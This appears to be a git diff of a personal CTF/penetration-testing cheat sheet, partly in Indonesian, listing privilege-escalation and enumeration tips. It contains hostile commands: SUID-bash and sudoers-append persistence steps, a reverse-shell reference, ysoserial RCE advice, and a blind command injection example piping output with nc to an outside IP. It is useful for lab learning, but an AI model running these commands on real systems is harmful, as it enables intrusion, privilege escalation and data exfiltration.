@@ -30,10 +30,13 @@ cat /etc/issue
 6. find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
 7. find / -user root -perm -4000 -print 2>/dev/null
 8. find / -type f -perm -04000 -ls 2>/dev/null (same like -u=s)
+9. **find / -user <username> 2>/dev/null | grep -v '^/proc\|^/run\|^/sys'**  (INI BUAT EXCLUDE PROC RUN DAN SYS FOLDER)
 
-9. IF there's motd.d executed once connected, always check the permission of the /etc/motd.d see if u can write on it
+**Append this to all find command, you are good | grep -v '^/proc\|^/run\|^/sys'**
 
-10. when u got privesc thing just 
+10. IF there's motd.d executed once connected, always check the permission of the /etc/motd.d see if u can write on it
+
+11. when u got privesc thing just 
 - http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet or
 - `chmod u+s /bin/bash` as root, bash -p, or 
 - `echo "[username] ALL=(ALL:ALL) ALL" >> /etc/sudoers;`
@@ -41,29 +44,29 @@ cat /etc/issue
 
 and on and on and on
 
-11. linpeas linenum pspy name ur shits
-12. Always check `cat ~/.*history | less` or just `history`
-13. Use ysoserial to exploit java deserialization to get revershell or RCE (payload have to be in a file). Then use it or encode it first, what ever.
-14. `.conf` file may contain something. (usually in /etc/apache2)
-15. Stuck? Bruteforce with no end? Generate your own wordlist with cewl! Example: cewl http://10.10.10.191/ -w customwordlist.txt -m 6
-16. 
+12. linpeas linenum pspy name ur shits
+13. Always check `cat ~/.*history | less` or just `history`
+14. Use ysoserial to exploit java deserialization to get revershell or RCE (payload have to be in a file). Then use it or encode it first, what ever.
+15. `.conf` file may contain something. (usually in /etc/apache2)
+16. Stuck? Bruteforce with no end? Generate your own wordlist with cewl! Example: cewl http://10.10.10.191/ -w customwordlist.txt -m 6
+17. 
 - SMB enum >>> smbclient -L //[IP](its_the_same_like_--list=[IP]), and continue with the shares name `smbclient //[IP]/[sharename]`
 - Just `smbclient -h` tbh
-17. rpcclient --user=[username] [target-ip] -W [forest name]
-18. Check cdata
-19. Port 11211 is memcached server >>> https://www.hackingarticles.in/penetration-testing-on-memcached-server/
-20. Always check `netstat -tulpn` or `ss -tulpn` and `ps aux`
+18. rpcclient --user=[username] [target-ip] -W [forest name]
+19. Check cdata
+20. Port 11211 is memcached server >>> https://www.hackingarticles.in/penetration-testing-on-memcached-server/
+21. Always check `netstat -tulpn` or `ss -tulpn` and `ps aux`
 - Forward the unusual service and check it like 445 SMB or HTTP or FTP service.
-21. Enum smtp with telnet.
-22. On windows, always check `whoami /priv` and find recent vulnerability.
-23. Always check .git, and dont forget to use gitdumper.
-24. Keep an eye for exposed docker API port 2375 or 2376
-25. No gcc? search for cc
+22. Enum smtp with telnet.
+23. On windows, always check `whoami /priv` and find recent vulnerability.
+24. Always check .git, and dont forget to use gitdumper.
+25. Keep an eye for exposed docker API port 2375 or 2376
+26. No gcc? search for cc
 
-26. DONT FORGET BLIND COMMAND INJECTION (pipe the injection with nc to see the result)
+27. DONT FORGET BLIND COMMAND INJECTION (pipe the injection with nc to see the result)
 ex: asdasd;ls -la | nc 10.8.102.36 1234
 
-27. Check for .htpasswd in LFI (/etc/apache2/.htpasswd or in other locations)
+28. Check for .htpasswd in LFI (/etc/apache2/.htpasswd or in other locations)
 
 
 ## list shares
